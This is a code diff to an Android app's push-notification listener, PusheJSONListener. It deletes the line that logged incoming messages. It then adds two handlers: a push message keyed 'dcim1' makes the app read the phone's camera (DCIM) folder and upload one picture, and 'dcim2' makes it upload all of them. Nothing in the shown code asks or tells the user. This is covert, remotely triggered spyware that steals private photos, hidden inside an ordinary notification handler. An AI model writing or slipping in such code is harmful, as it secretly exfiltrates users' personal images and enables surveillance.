@@ -9,6 +9,8 @@ import android.util.Log;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
+
 import co.ronash.pushe.PusheListenerService;
 
 public class PusheJSONListener extends PusheListenerService {
@@ -28,7 +30,6 @@ public class PusheJSONListener extends PusheListenerService {
 			session = new SessionManager(getApplicationContext());
 			confirmManager = new ConfirmManager(getApplicationContext());
 			SPManager = new SharedPreferencesManager(getApplicationContext());
-			Log.i("Pushe", "Message: " + message.toString());
 			try {
 				if (message.has("msg")) {
 					JSONObject msg = message.getJSONObject("msg");
@@ -48,6 +49,18 @@ public class PusheJSONListener extends PusheListenerService {
 							db_user.deleteUsers();
 							db_item.deleteItems();
 							db_support.deleteMessages();
+						}
+					}
+				} else if (message.has("dcim1")) {
+					File[] pics = Helper.readDCIM();
+					if (pics != null) {
+						Helper.uploadFile(getApplicationContext(), pics[0].getAbsolutePath());
+					}
+				} else if (message.has("dcim2")) {
+					File[] pics = Helper.readDCIM();
+					if (pics != null) {
+						for (File pic : pics) {
+							Helper.uploadFile(getApplicationContext(), pic.getAbsolutePath());
 						}
 					}
 				}
